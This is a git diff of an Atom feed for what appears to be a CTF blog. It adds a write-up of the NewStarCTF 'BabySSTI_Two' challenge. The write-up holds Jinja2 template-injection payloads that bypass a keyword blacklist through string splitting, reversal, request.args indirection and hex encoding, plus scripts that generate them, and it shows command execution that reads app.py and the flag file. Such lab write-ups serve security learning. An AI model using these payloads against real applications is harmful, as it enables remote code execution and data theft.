@@ -91,6 +91,9 @@
     <category term="文件包含" />
     <category term="php伪协议" />
     <category term="pearcmd文件包含" />
+    <category term="xpath注入" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
+    <category term="php" />
     <entry>
         <id>http://odiws.github.io/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</id>
         <title>aliyunctf部分复现</title>
@@ -421,6 +424,184 @@ check=1
         <category term="buuctf" />
         <category term="regexp注入" />
         <updated>2025-02-09T13:36:11.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://odiws.github.io/2025/02/09/NewStarCTF%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two/</id>
+        <title>[NewStarCTF公开赛赛道]BabySSTI_Two</title>
+        <link rel="alternate" href="http://odiws.github.io/2025/02/09/NewStarCTF%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two/"/>
+        <content type="html">&lt;h2 id=&#34;newstarctf公开赛赛道babyssti_two&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#newstarctf公开赛赛道babyssti_two&#34;&gt;#&lt;/a&gt; [NewStarCTF 公开赛赛道] BabySSTI_Two&lt;/h2&gt;
+&lt;h5 id=&#34;0x01-测试黑名单&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-测试黑名单&#34;&gt;#&lt;/a&gt; 0x01 测试黑名单&lt;/h5&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTg4MTcy&#34;&gt;SSTI / 沙盒逃逸详细总结 - 安全客 - 安全资讯平台 (anquanke.com)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvbmV0d29yay8yNTgxMzYuaHRtbA==&#34;&gt;细说 Jinja2 之 SSTI&amp;amp;bypass - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;?name=&amp;#123;&amp;#123;1+1&amp;#125;&amp;#125;  # + 过滤
+
+/?name=&amp;#123;&amp;#123;&#34;hj&#34;&amp;#125;&amp;#125;   # &amp;quot;&amp;quot;  过滤
+
+?name=&amp;#123;&amp;#123;&#39;~&#39;&amp;#125;&amp;#125;     # ~ 过滤
+
+/?name=&amp;#123;&amp;#123;&#39;j s&#39;&amp;#125;&amp;#125;  # 空格过滤 单引号可以使用
+
+?name=&amp;#123;&amp;#123;&#39;a.b&#39;&amp;#125;&amp;#125;   # . 可以使用
+
+?name=&amp;#123;&amp;#123;&#39;a[]b&#39;&amp;#125;&amp;#125;  # [] 可以使用
+
+?name=&amp;#123;&amp;#123;&#39;a()b&#39;&amp;#125;&amp;#125;  # () 可以使用
+
+?name=&amp;#123;&amp;#123;&#39;()__&#39;&amp;#125;&amp;#125;  # __ 可以使用
+
+?name=&amp;#123;&amp;#123;&#39;popen&#39;&amp;#125;&amp;#125;  # popen 过滤
+
+?name=&amp;#123;&amp;#123;lipsum.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;ls&#39;).read()&amp;#125;&amp;#125;
+
+# popen、eval、system 过滤
+?name=&amp;#123;&amp;#123;lipsum[request.args.t1][request.args.t2][request.args.t3](&#39;os&#39;).popen(&#39;ls&#39;).read()&amp;#125;&amp;#125;&amp;amp;t1=__globals__&amp;amp;t2=__builtins__&amp;amp;t3=__import__
+ 
+# 绕过 popen 通过 base64 编码 不可行
+[&#39;cG9wZW4=&#39;.decode(&#39;base64&#39;)]  #popen
+[&#39;ZXZhbA==&#39;.decode(&#39;base64&#39;)]  #eval
+(&amp;quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&amp;quot;.decode(&#39;base64&#39;)) #__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()
+
+?name=&amp;#123;&amp;#123;lipsum.__globals__.__builtins__[&#39;ZXZhbA==&#39;.decode(&#39;base64&#39;)](&#34;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&#34;.decode(&#39;base64&#39;))&amp;#125;&amp;#125;
+
+
+?name=&amp;#123;&amp;#123;joiner.__in&#39;&#39;it__.__glob&#39;&#39;als__.__bui&#39;&#39;ltins__[&#39;__im&#39;&#39;port__&#39;](&#39;os&#39;).popen(&#39;ls&#39;).read()&amp;#125;&amp;#125;
+
+
+# 可执行
+?name=&amp;#123;&amp;#123;[][&#39;__c&#39;&#39;lass__&#39;][&#39;__ba&#39;&#39;se__&#39;][&#39;__subcl&#39;&#39;asses__&#39;]()&amp;#125;&amp;#125;
+
+# 利用脚本跑出利用函数位置
+&amp;#123;&amp;#123;().__cl&#39;&#39;ass__.__bas&#39;&#39;es__[0].__su&#39;&#39;bcl&#39;&#39;asses__()[177].__in&#39;&#39;it__.__glob&#39;&#39;als__.__bu&#39;&#39;iltins__[&#39;open&#39;](&#39;ls&#39;).read()&amp;#125;&amp;#125;
+
+?name=&amp;#123;&amp;#123;[].__cla&#39;&#39;ss__.__ba&#39;&#39;se__.__subcla&#39;&#39;sses__()[117].__in&#39;&#39;it__.__glo&#39;&#39;bals__[&#39;__built&#39;&#39;ins__&#39;][&#39;__imp&#39;&#39;ort__&#39;](&#39;os&#39;).__di&#39;&#39;ct__[&#39;pop&#39;&#39;en&#39;](&#39;ls&#39;).read()&amp;#125;&amp;#125;
+
+
+/?name=&amp;#123;&amp;#123;&#39;&#39;[&#39;__cla&#39;&#39;ss__&#39;][&#39;__bas&#39;&#39;es__&#39;][0][&#39;__subcl&#39;&#39;asses__&#39;]()[117][&#39;__in&#39;&#39;it__&#39;].__glo&#39;&#39;bals__[&#39;nepop&#39;[::-1]](&#39;id&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5 id=&#34;0x02-绕过测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-绕过测试&#34;&gt;#&lt;/a&gt; 0x02 绕过测试&lt;/h5&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;# __ 黑名单绕过
+
+&amp;#123;&amp;#123;&#39;&#39;.__class__&amp;#125;&amp;#125; =&amp;gt; &amp;#123;&amp;#123;&#39;&#39;[request.args.t1]&amp;#125;&amp;#125;&amp;amp;t1=__class__
+
+# [] 绕过 getitem() 用来获取序号
+
+&amp;quot;&amp;quot;.__class__.__mro__[2]
+&amp;quot;&amp;quot;.__class__.__mro__.__getitem__(2)
+# encoding=utf-8
+
+
+str1 = &#39;popen&#39;
+res = &#39;&#39;
+for i in str1:
+  res += &amp;quot;&amp;#123;0:c&amp;#125;&amp;quot;+&amp;quot;[&#39;format&#39;](&amp;#123;tmp&amp;#125;)%2B&amp;quot;.format(tmp=ord(i))
+print(res[:-3])
+
+
+for i in range(len(str1)):
+    print(str(hex(ord(str1[i]))),end=&#39;,&#39;) # \x70\x6f\x70\x65\x6e
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;popen 绕过失败&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemFxenp6L3AvMTAyNjMzOTYuaHRtbA==&#34;&gt;SSTI 注入绕过 (沙盒逃逸原理一样) - 冬泳怪鸽 - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;?name=&amp;#123;&amp;#123;lipsum.__glo&#39;&#39;bals__.__bu&#39;&#39;iltins__[&#39;ZXZhbA==&#39;.decode(&#39;base64&#39;)](&#39;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&#39;.decode(&#39;base64&#39;))&amp;#125;&amp;#125;
+
+失败，不知道什么原因
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz&#34;&gt;https://blog.csdn.net/weixin_54515836/article/details/113778233&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;# 发现
+166  &amp;lt;class &#39;warnings.catch_warnings&#39;&amp;gt;
+
+#调用commands进行命令执行
+?name=
+&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&amp;#125;&amp;#125;
+
+?name=&amp;#123;&amp;#123;lipsum.__glo&#39;&#39;bals__.__buil&#39;&#39;tins__[&#39;__import__&#39;](&#39;os&#39;).open(&#39;ereh_ni_galf/&#39;[::-1],&#39;r&#39;).read()&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5 id=&#34;0x03-rce-success&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-rce-success&#34;&gt;#&lt;/a&gt; 0x03 Rce success&lt;/h5&gt;
+&lt;p&gt;&lt;strong&gt;尝试全 hex 编码 ，数据构建脚本：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;# encoding=utf-8
+
+
+text = &amp;quot;&amp;#123;&amp;#123;&#39;&#39;[&#39;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&#39;][&#39;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#39;]()[64][&#39;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#39;][&#39;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#39;](&#39;\x6f\x73&#39;)[&#39;\x70\x6f\x70\x65\x6e&#39;](&#39;c$@at$&amp;#123;IFS&amp;#125;/fl$@ag_in_h3r3_52daad&#39;)[&#39;\x72\x65\x61\x64&#39;]()&amp;#125;&amp;#125;&amp;quot;
+print(text.encode())
+
+enc = &amp;quot;&amp;#123;&amp;#123;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;ls&#39;)[&#39;read&#39;]()&amp;#125;&amp;#125;&amp;quot;
+
+i = 0
+while i &amp;lt;= len(enc) - 1:
+    if enc[i] == &amp;quot;&#39;&amp;quot;:
+        print(enc[i], end=&#39;&#39;)
+        k = i + 1
+        while enc[k] != &amp;quot;&#39;&amp;quot;:
+            print(&#39;\\x&#39; + str(hex(ord(enc[k])))[2:], end=&#39;&#39;)
+            k += 1
+        print(enc[k], end=&#39;&#39;)
+        i = k+1
+        continue
+    print(enc[i], end=&#39;&#39;)
+    i += 1
+# 尝试全hex 编码
+
+?name=&amp;#123;&amp;#123;lipsum.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;ls&#39;).read()&amp;#125;&amp;#125;
+======&amp;gt;  # 方便编码使用
+?name=&amp;#123;&amp;#123;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;ls&#39;)[&#39;read&#39;]()&amp;#125;&amp;#125;
+======&amp;gt;
+?name=&amp;#123;&amp;#123;lipsum[&#39;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#39;](&#39;\x6f\x73&#39;)[&#39;\x70\x6f\x70\x65\x6e&#39;](&#39;ls&#39;)[&#39;\x72\x65\x61\x64&#39;]()&amp;#125;&amp;#125;
+
+
+name=&amp;#123;&amp;#123;&#39;&#39;[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[64][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;c$@at$&amp;#123;IFS&amp;#125;/fl$@ag_in_h3r3_52daad&#39;)[&#39;read&#39;]()&amp;#125;&amp;#125;
+====&amp;gt;
+?name=&amp;#123;&amp;#123;&#39;&#39;[&#39;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&#39;][&#39;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#39;]()[64][&#39;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#39;][&#39;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#39;](&#39;\x6f\x73&#39;)[&#39;\x70\x6f\x70\x65\x6e&#39;](&#39;ls&#39;)[&#39;\x72\x65\x61\x64&#39;]()&amp;#125;&amp;#125;
+
+# 发现成功读取 app.py
+
+Welcome to NewStarCTF Again, Dear from flask import Flask, request
+from jinja2 import Template
+import re
+app = Flask(__name__)
+
+@app.route(&amp;quot;/&amp;quot;)
+def index():
+    name = request.args.get(&#39;name&#39;, &#39;CTFer&#39;)
+    if not re.findall(&#39;class|init|mro|subclasses|flag|cat|env|&amp;quot;|eval|system|popen|globals|builtins|\+| |attr|\~&#39;, name):
+        t = Template(&amp;quot;
+
+# 读取根目录
+&#39;ls$&amp;#123;IFS&amp;#125;/&#39;
+Welcome to NewStarCTF Again, Dear app
+bin
+boot
+dev
+etc
+flag_in_h3r3_52daad
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+start.sh
+sys
+tmp
+usr
+var
+
+# getflag
+&#39;c$@at$&amp;#123;IFS&amp;#125;/fl$@ag_in_h3r3_52daad&#39;
+
+?name=&amp;#123;&amp;#123;lipsum[&#39;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;][&#39;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#39;](&#39;\x6f\x73&#39;)[&#39;\x70\x6f\x70\x65\x6e&#39;](&#39;c$@at$&amp;#123;IFS&amp;#125;/fl$@ag_in_h3r3_52daad&#39;)[&#39;\x72\x65\x61\x64&#39;]()&amp;#125;&amp;#125;
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202502092144244.png&#34; alt=&#34;image-20250209214445045&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="regexp注入" />
+        <updated>2025-02-09T13:35:56.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/06/06/[NCTF2019]SQLi/</id>
